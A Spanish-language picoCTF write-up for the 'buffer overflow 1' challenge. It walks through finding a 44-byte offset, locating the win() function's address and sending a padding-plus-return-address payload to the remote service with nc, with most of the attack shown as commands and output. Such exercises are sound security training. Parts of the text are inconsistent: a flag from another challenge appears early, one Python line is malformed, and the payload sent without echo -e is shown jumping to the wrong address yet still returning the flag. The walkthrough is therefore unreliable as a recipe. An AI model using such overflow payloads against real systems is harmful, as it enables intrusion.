# buffer overflow 1

## Objetivo.

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 64318`

## Solución.

**Primero hay que descargar los archivos binario y c** 

**Dar permiso de ejecución al archivo binario**

```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ chmod +x vuln
```

**Correr el archivo**

```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ ./vuln
Please enter your string: 
asdfghjkl7
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

Nos pide una cadena y luego hace un salto.

**Bandera** picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}

**Hayaremos el limite que pueda evitar el salto**

```
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

**Después hacemos echo a lo obtenido para crear una falla de segmento**

```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
Segmentation fault (core dumped)
```

**Ahora veremos cuantos caracteres acepta a partir de la direccion de salto proporcionada que 0x6161616c**

```
>>> cyclic(0x6161616c)
44
```

El límite es 44.

**Generamos 44 A's**

```
>>> 'A'*44*
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

**Encontrar la dirección de retorno e invertirla**

```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ objdump -D vuln -M intel | grep 'win'
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
```

La dirección es: 080491f6

Invertida
```
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
```

**En teoria rellenerá la pila con 44 caracteres hasta la dirección de retorno**

**Hacer una flag y posteriormente el relleno**
```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ echo 'flag(dummieflag)'>flag.txt

frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x3666785c
Segmentation fault (core dumped)
```

**Se lo mandamos al puerto remoto**

```
frausto_san-picoctf@webshell:~/picoctf/binaryexplotation/bufferoverflow1$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 64318
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x3666785c
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}
```

Bandera:  picoCTF{addr3ss3s_ar3_3asy_9cf083f8}

## Notas opcionales.

## Referencias.

Vídeo

https://www.youtube.com/watch?v=vVcGj3kIz-g&t=182s&ab_channel=hackadvisermx